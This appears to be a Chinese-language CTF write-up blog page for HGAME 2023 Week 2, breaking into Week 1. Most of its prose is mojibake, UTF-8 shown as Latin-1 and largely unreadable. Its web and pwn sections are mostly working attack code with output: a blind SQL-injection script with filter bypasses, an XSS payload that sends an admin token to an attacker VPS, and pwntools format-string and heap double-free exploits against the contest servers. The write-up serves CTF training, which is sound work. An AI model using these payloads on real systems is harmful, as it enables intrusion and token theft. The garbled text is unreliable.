ä½œä¸ºauthorizationå¤´å‘é€ï¼Œè®©æœåŠ¡å™¨å°†æ™®é€šç”¨æˆ·çš„Authorizationå¤´å†™å…¥ç¼“å­˜ä¸­ï¼› æœ€ååªè¦å¸¦ä¸Šè¿™ä¸ªAuthorizationå¤´å³å¯è®¿é—®æ‰€æœ‰çš„ç®¡ç†å‘˜æ¥å£ã€‚ è®¿é—® http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1ï¼Œå¾—åˆ°flagï¼šhgame&#123;39d580e71705f6abac9a414def74c466&#125;ã€‚ â€‹ Search Commodity R1esbyfeç»™å…”å…”å†™äº†ä¸€ä¸ªç®€æ˜“çš„æŸ¥è¯¢é¢æ¿ï¼Œåªéœ€è¦è¾“å…¥idæ•°å­—ï¼Œå°±å¯ä»¥æŸ¥åˆ°å…”å…”æœ€è¿‘ä¹°çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬å¹´è´§ï¼‰ R1esbyfe:â€é¢æ¿ç™»é™†ç”¨æˆ·åæ˜¯user01,å¯†ç â€¦â€¦å¿˜äº†ï¼Œåæ­£æ˜¯ä¸ªæ¯”è¾ƒå¥½çŒœçš„å¯†ç â€ è²Œä¼¼R1esbyfeè¿˜è—äº†ç‚¹æƒŠå–œï¼Œä½ èƒ½å¸®åŠ©å…”å…”æ‰¾åˆ°å®ƒå—ï¼Ÿ (æ•°æ®åº“å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œè‹¥å‡ºç°Internal Errorï¼Œéœ€è¦ç¨ç­‰ç‰‡åˆ») HINTS: å¯†ç æ˜¯å¼±å¯†ç ï¼Œå¯ä»¥è‡ªå·±æ‰¾ä¸ªdictçˆ†ç ´ä¸€ä¸‹ æ ¹æ®hintçŒœå¯†ç  admin123ï¼Œsqlæ³¨å…¥ï¼Œfuzzå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€selectã€databaseã€orã€ç­‰å·ã€å¤§å°äºå·ç­‰å…³é”®å­—ã€‚å…³é”®å­—æ”¹å¤§å†™ï¼Œç­‰å·æ”¹ regexp ç»•è¿‡ã€‚ å¸ƒå°”ç›²æ³¨ï¼š 123456789101112131415161718192021222324252627282930313233import requestsimport stringdic = string.digits+string.ascii_letters+&#x27;&#123;&#125;-_?!,&#x27;s = requests.Session()url = &#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;now = &#x27;&#x27;for i in range(1,100): flag = 0 for j in dic: #sql = &#x27;SELECT(DATABASE())&#x27; #sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27; #sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27; sql = &#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27; payload = f&quot;0^(substr((&#123;sql&#125;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;))&quot; #print(payload) data = &#123;&#x27;search_id&#x27;:payload&#125; cookie = &#123;&#x27;SESSION&#x27;:&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;&#125; r = s.post(url,data=data,cookies=cookie) #print(r.text) if &#x27;hard disk&#x27; in r.text: now += j print(now) flag = 1 break if flag == 0: break # database: se4rch# table: 5ecret15here,L1st,user1nf0# column: f14gggg1shere# 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d å¾—åˆ°flagï¼šhgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;ã€‚ â€‹ Designer Come and design your button åœ¨ index.js ä¸­ /button/share è·¯ç”±ä¼šè°ƒç”¨ /button/preview è·¯ç”±ï¼š 123456789101112131415161718192021222324252627282930app.post(&quot;/button/share&quot;, auth, async (req, res) =&gt; &#123; const browser = await puppeteer.launch(&#123; headless: true, executablePath: &quot;/usr/bin/chromium&quot;, args: [&#x27;--no-sandbox&#x27;] &#125;); const page = await browser.newPage() const query = querystring.encode(req.body) await page.goto(&#x27;http://127.0.0.1:9090/button/preview?&#x27; + query) await page.evaluate(() =&gt; &#123; return localStorage.setItem(&quot;token&quot;, &quot;jwt_token_here&quot;) &#125;) await page.click(&quot;#button&quot;) res.json(&#123; msg: &quot;admin will see it later&quot; &#125;)&#125;)app.get(&quot;/button/preview&quot;, (req, res) =&gt; &#123; const blacklist = [ /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/ ] for (const key in req.query) &#123; for (const item of blacklist) &#123; if (item.test(key.trim()) || item.test(req.query[key].trim())) &#123; req.query[key] = &quot;&quot; &#125; &#125; &#125; res.render(&quot;preview&quot;, &#123; data: req.query &#125;)&#125;) æµ‹è¯•å‘ç° /button/preview è·¯ç”±å­˜åœ¨XSSæ³¨å…¥ï¼Œå°è¯•XSSè¯·æ±‚ä¼ªé€ ï¼š 12345678var xhr=new XMLHttpRequest();xhr.open(&quot;POST&quot;,&quot;http://127.0.0.1:9090/user/register&quot;,false);xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xhr.send(JSON.stringify(&#123;&quot;username&quot;:&quot;admin&quot;&#125;));url=&quot;http://VPS-IP/x.php?token=&quot;+String(xhr.responseText);var xhr2=new XMLHttpRequest();xhr2.open(&quot;GET&quot;,url,false);xhr2.send(&quot;token&quot;); adminç‚¹å‡»åï¼Œç”Ÿæˆæ­£ç¡®tokenï¼Œå‘é€åˆ°VPSçš„apacheæ—¥å¿—ä¸­ï¼š 1[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot; è§£æjwtï¼Œå¾—åˆ°flagï¼šhgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;ã€‚ â€‹ Reversebefore_mainåœ¨ sub_558AEC339229() ä¸­ä½¿ç”¨ ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) æœºåˆ¶å°†base64ç è¡¨ä¿®æ”¹ï¼š 123456789101112__int64 sub_558AEC339229()&#123; __int64 result; // rax result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL); if ( result != -1 ) &#123; strcpy((char *)&amp;qword_558AEC33C020, &quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;); return 0x636D79474568756ALL; &#125; return result;&#125; å†è§£ç å³å¯ï¼Œflagï¼šhgame&#123;s0meth1ng_run_befOre_m@in&#125;ã€‚ â€‹ stream å…”å…”å‡æœŸå‰å­¦ä¹ äº†ç¼–ç¨‹ï¼Œä½ èƒ½çœ‹å‡ºæ¥ä»–å­¦çš„æ˜¯ä»€ä¹ˆè¯­è¨€å— pythonç¨‹åºé€†å‘ï¼Œä½¿ç”¨pyinstxtractorå°†exeè§£åŒ…å¾—åˆ° stream.pyc æ–‡ä»¶ï¼Œå†ç”¨uncompyle6åç¼–è¯‘ï¼Œå¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041# Source Generated with Decompyle++# File: stream.pyc (Python 3.8)import base64def gen(key):Warning: block stack is not empty! s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key):Warning: block stack is not empty! result = &#x27;&#x27; for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) result = base64.b64encode(result.encode()).decode() return resulttext = input(&#x27;Flag: &#x27;)key = &#x27;As_we_do_as_you_know&#x27;enc = encrypt(text, key)if enc == &#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;: print(&#x27;yes!&#x27;) return NoneNone(&#x27;try again...&#x27;) è¯†åˆ«ä¸ºRC4åŠ å¯†ç®—æ³•ï¼Œcyberchefè§£å‡ºflagï¼šhgame&#123;python_reverse_is_easy_with_internet&#125;ã€‚ â€‹ math ç”±äºå…”å…”çš„å­¦æ ¡æå‰æ”¾å‡ï¼Œå¼€å­¦æ‰èƒ½æœŸæœ«è€ƒè¯•ï¼Œäºæ˜¯å…”å…”å¼€å§‹äº†ä»–çš„å¯’å‡æœŸæœ«å¤ä¹ ~ å®é™…ä¸ºè§£éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„ï¼ŒçŸ©é˜µä¹˜æ³•é€†è¿ç®—ï¼Œè¿™é‡Œä½¿ç”¨z3æ±‚è§£ï¼š 123456789101112131415161718192021222324252627from z3 import *x = [126, 225, 62, 40, 216, 253, 20, 124, 232, 122, 62, 23, 100, 161, 36, 118, 21, 184, 26, 142, 59, 31, 186, 82, 79]out = [0] * len(x)c = [63998, 33111, 67762, 54789, 61979, 69619, 37190, 70162, 53110, 68678, 63339, 30687, 66494, 50936, 60810, 48784, 30188, 60104, 44599, 52265, 43048, 23660, 43850, 33646, 44270]s = Solver()f = [Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(25)]ff = f[:]for i in range(5): for j in range(5): tmp = 0 for k in range(5): out[5*i+j] += ff[5*i+k] * x[5*k+j] s.add(out[5*i+j] == c[5*i+j])s.check()m = s.model()flag = &#x27;&#x27;for i in range(25): flag += chr(m[f[i]].as_long())print(flag)# hgame&#123;y0ur_m@th_1s_gO0d&#125; â€‹ VidarCamera å…”å…”æœ€è¿‘åœ¨å­¦ä¹ Androidå¼€å‘ï¼Œè¿™æ˜¯ä»–æŠ„çš„ç›¸æœºç¨‹åº apkå†…å…³é”®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152private final int[] m229encrypthkIa6DI(int[] iArr) &#123; int i; int[] m446constructorimpl = UIntArray.m446constructorimpl(4); UIntArray.m457setVXSXFK8(m446constructorimpl, 0, 2233); UIntArray.m457setVXSXFK8(m446constructorimpl, 1, 4455); UIntArray.m457setVXSXFK8(m446constructorimpl, 2, 6677); UIntArray.m457setVXSXFK8(m446constructorimpl, 3, 8899); int i2 = 0; while (i2 &lt; 9) &#123; int i3 = 0; int i4 = 0; do &#123; i3++; i = i2 + 1; UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; 3)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; 4) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; 5)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4))); UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; 4) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; 5)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; 11) &amp; 3)) + i4)))); i4 = UInt.m393constructorimpl(i4 + 878077251); &#125; while (i3 &lt;= 32); i2 = i; &#125; return iArr;&#125;public static final void m230onCreate$lambda0(EditText inputsomething, CameraActivity this$0, AlertDialog alertDialog, View view) &#123; Intrinsics.checkNotNullParameter(inputsomething, &quot;$inputsomething&quot;); Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;); String obj = inputsomething.getText().toString(); if (obj.length() != 40) &#123; Toast.makeText(this$0, &quot;åºåˆ—å·ä¸æ­£ç¡®&quot;, 0).show(); return; &#125; int[] m446constructorimpl = UIntArray.m446constructorimpl(10); for (int i = 0; i &lt; 40; i += 4) &#123; UIntArray.m457setVXSXFK8(m446constructorimpl, i / 4, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + 1) &lt;&lt; &#x27;\\b&#x27;)) + UInt.m393constructorimpl(obj.charAt(i + 2) &lt;&lt; 16)) + UInt.m393constructorimpl(obj.charAt(i + 3) &lt;&lt; 24))); &#125; int[] m229encrypthkIa6DI = this$0.m229encrypthkIa6DI(m446constructorimpl); UInt[] uIntArr = &#123;UInt.m387boximpl(637666042), UInt.m387boximpl(457511012), UInt.m387boximpl(-2038734351), UInt.m387boximpl(578827205), UInt.m387boximpl(-245529892), UInt.m387boximpl(-1652281167), UInt.m387boximpl(435335655), UInt.m387boximpl(733644188), UInt.m387boximpl(705177885), UInt.m387boximpl(-596608744)&#125;; int i2 = 0; while (true) &#123; int i3 = i2 + 1; if (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123; Toast.makeText(this$0, &quot;åºåˆ—å·ä¸æ­£ç¡®&quot;, 0).show(); return; &#125; else if (i3 &gt; 9) &#123; alertDialog.dismiss(); return; &#125; else &#123; i2 = i3; &#125; &#125;&#125; é­”æ”¹XTEAåŠ å¯†ï¼Œä¿®æ”¹äº†deltaã€å¼‚æˆ–æ“ä½œå’ŒåŠ å¯†é¡ºæ¬¡ï¼Œè§£å¯†è„šæœ¬åœ¨ç›¸åº”åœ°æ–¹ä¿®æ”¹ï¼š 1234567891011121314151617181920212223242526272829from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] delta = 0x34566543 x = delta * 33 for i in range(33): x -= delta x = x &amp; 0xFFFFFFFF v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) ^ x v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return v c = [0x260202FA, 0x1B451064, 0x867B61F1, 0x228033C5, 0xF15D82DC, 0x9D8430B1, 0x19F2B1E7, 0x2BBA859C, 0x2A08291D, 0xDC707918]key = [2233, 4455, 6677, 8899]flag = b&#x27;&#x27;for i in range(len(c)-1): d = decrypt(c[-2:], key) flag = long_to_bytes(d[1])[::-1] + flag c = c[:-2] + [d[0]]print(flag)# b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27; è¡¥å…¨flagå¤´ï¼Œflagï¼šhgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;ã€‚ â€‹ PwnYukkuriSay HINTS: æ ¼å¼åŒ–å ä½ç¬¦çš„å€¼æ¥è‡ªäºå‡½æ•°çš„å‚æ•°ï¼ŒåŒæ—¶64ä½ç¨‹åºä¼ å‚ä¸æ˜¯åªç”¨å¯„å­˜å™¨çš„å“¦ %nå ä½ç¬¦æ˜¯å­˜åœ¨æº¢å‡ºçš„ æ‰“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«æ³„éœ²æ ˆåœ°å€å’Œ __libc_start_main() åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œå†ç”¨one_gadgetæ‰“å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote(&#x27;week-2.hgame.lwsec.cn&#x27;,30687)elf = ELF(&#x27;vuln&#x27;)libc = ELF(&quot;libc-2.31.so&quot;)r.recvline()r.send(&#x27;a&#x27;*0x100)stack_addr = u64(r.recvuntil(&#x27;\\x7f&#x27;)[-6:]+&#x27;\\x00&#x27;*2)-8print(hex(stack_addr))r.recvline()r.sendline(&#x27;Y&#x27;)r.send(p64(stack_addr)*0x20)r.recvline()r.sendline(&#x27;n&#x27;)pl = &#x27;%45$p%4418c%8$hn&#x27;r.send(pl)r.recvuntil(&#x27;0x&#x27;)libc_start_main = eval(&#x27;0x&#x27;+r.recv(12))-243libc_base = libc_start_main - libc.sym.__libc_start_mainprint(hex(libc_base))#r.recvline()ogg = libc_base+0xe3b01r.recvline()pl = p64(stack_addr-224+2)+p64(stack_addr-224)r.send(pl)r.recvline()r.sendline(&#x27;n&#x27;)pl = &#x27;%&#x27;+str((ogg&gt;&gt;16)&amp;0xff)+&#x27;c%8$hhn&#x27;+&#x27;%&#x27;+str((ogg&amp;0xffff)-((ogg&gt;&gt;16)&amp;0xff))+&#x27;c%9$hn&#x27;r.send(pl)r.interactive() â€‹ fast_notelibc 2.23 UAFï¼Œæ³„éœ² __malloc_hook() åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œdouble freeåä½¿ç”¨ realloc() è°ƒè¯•ï¼Œä½¿å¾—æ»¡è¶³one_gadgetæ¡ä»¶å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(&#x27;week-2.hgame.lwsec.cn&#x27;,31341)libc = ELF(&quot;libc-2.23.so&quot;)def add(ind,size,content): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind)) r.sendlineafter(&#x27;Size: &#x27;,str(size)) r.sendafter(&#x27;Content: &#x27;,content) def free(ind): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind))def show(ind): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind))add(0,0x80,&#x27;a&#x27;*0x80)add(1,0x80,&#x27;b&#x27;*0x80)free(0)show(0)malloc_hook = u64(r.recv(6)+&#x27;\\x00&#x27;*2)-104libc_base = malloc_hook - libc.sym.__malloc_hookprint(hex(libc_base))add(2,0x80,&#x27;a&#x27;*0x80)add(3,0x60,&#x27;c&#x27;*0x60)add(4,0x60,&#x27;d&#x27;*0x60)add(5,0x60,&#x27;e&#x27;*0x60)free(3)free(4)free(3)add(6,0x60,p64(malloc_hook-0x23))add(7,0x60,&#x27;f&#x27;*0x60)add(8,0x60,&#x27;f&#x27;*0x60)ogg = libc_base + 0xf1247realloc = libc_base + libc.sym.reallocprint(hex(realloc))add(9,0x60,&#x27;\\x00&#x27;*0xb+p64(ogg)+p64(realloc+0x6))r.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)r.sendlineafter(&#x27;Index: &#x27;,&#x27;10&#x27;)r.sendlineafter(&#x27;Size: &#x27;,&#x27;20&#x27;)r.interactive() â€‹ IotPirated router å…”å…”åœ¨å›å®¶çš„ç«è½¦ä¸Š,çœ‹åˆ°ä¸€ä¸ªç¥ç§˜çš„0tatoPåœ¨å–è·¯ç”±å™¨,äºæ˜¯å…”å…”ä¹°äº†ä¸€ä¸ªå›å®¶è¿‡å¹´,ä½†æ˜¯è¿™ä¸ªè·¯ç”±å™¨å’‹æ€»æ„Ÿè§‰æ€ªæ€ªçš„ è·¯ç”±å™¨binå›ºä»¶æ–‡ä»¶ï¼Œå‚è€ƒæå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsæ–‡ä»¶ç³»ç»Ÿunsquashfsæå–æ–¹æ³•ï¼Œæå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsã€‚ å®‰è£…squashfsåï¼Œä½¿ç”¨binwalkåˆ†ç¦»binæ–‡ä»¶ï¼šbinwalk -e AC10086W_FW_1.1.4.5.binï¼Œç”Ÿæˆæ–‡ä»¶å¤¹ squashfs-rootï¼Œå…¶ä¸­çš„squashfsæ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å¤´ä¸º hsqsã€‚ åˆ©ç”¨ firmware-mod-kit è§£åŒ…squashfsæ–‡ä»¶ï¼šunsquashfs 1.squashfsï¼Œåœ¨ /bin ç›®å½•ä¸­å‘ç°ä¸€ä¸ªæ–‡ä»¶åæ¯”è¾ƒç‰¹åˆ«çš„ç¨‹åº secret_programï¼Œä½¿ç”¨IDAæŸ¥çœ‹é€»è¾‘ï¼Œmain() å‡½æ•°ä¸­ï¼š 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; _OWORD v4[8]; // [xsp+10h] [xbp+10h] int v5; // [xsp+90h] [xbp+90h] unsigned int v6; // [xsp+98h] [xbp+98h] int i; // [xsp+9Ch] [xbp+9Ch] v4[0] = unk_4543B0; v4[1] = unk_4543C0; v4[2] = unk_4543D0; v4[3] = unk_4543E0; v4[4] = unk_4543F0; v4[5] = unk_454400; v4[6] = unk_454410; v4[7] = unk_454420; v5 = 94; v6 = 35; for ( i = 0; i &lt;= 32; ++i ) printf(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6); return 0;&#125; æå–æ•°æ®ï¼Œç®€å•å¼‚æˆ–æ“ä½œè¿˜åŸï¼š 12345s = [75, 68, 66, 78, 70, 88, 86, 77, 83, 23, 64, 72, 18, 77, 68, 124, 69, 74, 81, 78, 84, 66, 81, 70, 124, 18, 80, 124, 16, 98, 80, 90, 94]ss = [k^35 for k in s]print(bytes(ss))# b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 1","slug":"match-HGAME-2023-Week-1","date":"2023-01-11T10:51:02.000Z","updated":"2023-01-13T10:19:10.014Z","comments":true,"path":"2023/01/11/match-HGAME-2023-Week-1/","permalink":"https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/","excerpt":"","text":"â€‹ HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps://hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3åï¼š600Pwnhubé‡‘å¸4-10åï¼š300Pwnhubé‡‘å¸è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ªæ³¨æ„ï¼š* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰ Rank: 1 â€‹ MiscSign In æ¬¢è¿å‚åŠ HGAME2023,Base64è§£ç è¿™æ®µFlagï¼Œç„¶åå’Œå…”å…”ä¸€èµ·å¼€å§‹ä½ çš„HGAMEä¹‹æ—…å§ï¼Œç¥ä½ ç©çš„æ„‰å¿«ï¼ aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ== ç­¾åˆ°ï¼Œbase64è§£ç ï¼Œflagï¼šhgame&#123;Welcome_To_HGAME2023!&#125;ã€‚ â€‹ Where am I å…”å…”å›å®¶ä¹‹å‰å»äº†ä¸€ä¸ªç¥ç§˜çš„åœ°æ–¹ï¼Œå¹¶æ‹äº†å¼ ç…§ä¸Šä¼ åˆ°ç½‘ç›˜ï¼Œä½ çŸ¥é“ä»–å»äº†å“ªé‡Œå—ï¼Ÿ flagæ ¼å¼ä¸º: hgame&#123;ç»åº¦æ—¶_ç»åº¦åˆ†_ç»åº¦ç§’_ä¸œç»(E)/è¥¿ç»(W)_çº¬åº¦æ—¶_çº¬åº¦åˆ†_çº¬åº¦ç§’_å—çº¬(S)/åŒ—çº¬(N)&#125;ï¼Œç§’ç²¾ç¡®åˆ°å°æ•°ç‚¹åä¸¤ä½ ä¾‹å¦‚: 11Â°22â€™33.99â€™â€™E, 44Â°55â€™11.00â€™â€™S è¡¨ç¤ºä¸º hgame{11_22_3399_E_44_55_1100_S} wiresharkæ‰“å¼€æµé‡æ–‡ä»¶ï¼Œåœ¨TCPæµ15æå–raræ–‡ä»¶ï¼› 16è¿›åˆ¶ä¸‹æŸ¥çœ‹raræ–‡ä»¶ï¼ŒæŸ¥çœ‹ç¬¬24ä¸ª16è¿›åˆ¶æ•°ä¸º24ï¼Œä¿®æ”¹ä¸º 20 å»é™¤ä¼ªåŠ å¯†ï¼Œè§£å‹å¾—åˆ° Exchangeable.jpgï¼› æŸ¥çœ‹jpgæ–‡ä»¶å±æ€§ï¼Œå‘ç°GPSç»çº¬åº¦ä¿¡æ¯ï¼Œæå–ç»çº¬åº¦æ•°æ®æŒ‰æ ¼å¼å¾—åˆ°flagï¼šhgame&#123;116_24_1488_E_39_54_5418_N&#125;ã€‚ â€‹ ç¥ç§˜çš„æµ·æŠ¥ åè½¦å›åˆ°å®¶çš„å…”å…”å¬è¯´ek1ngåœ¨HGAMEçš„æµ·æŠ¥ä¸­éšè—äº†ä¸€ä¸ªç§˜å¯†â€¦â€¦ï¼ˆè¿˜è®°å¾—æˆ‘ä»¬çš„MiscåŸ¹è®­å—ï¼Ÿ zstegæŸ¥çœ‹pngå›¾ç‰‡ï¼Œå‘ç°åœ¨ b1,rgb,lsb,xy å­˜åœ¨lsbéšå†™å†…å®¹ï¼š 12Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so å¾—åˆ°flagå‰åŠéƒ¨åˆ† hgame&#123;U_Kn0w_LSB&amp;Wã€‚ åˆ°googleäº‘ç›˜ä¸‹è½½ Bossanova.wav æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢æ–‡å­—æç¤º I use Steghide to encrypt, the password is also the 6-digit passwordï¼Œä½¿ç”¨äº† Steghide 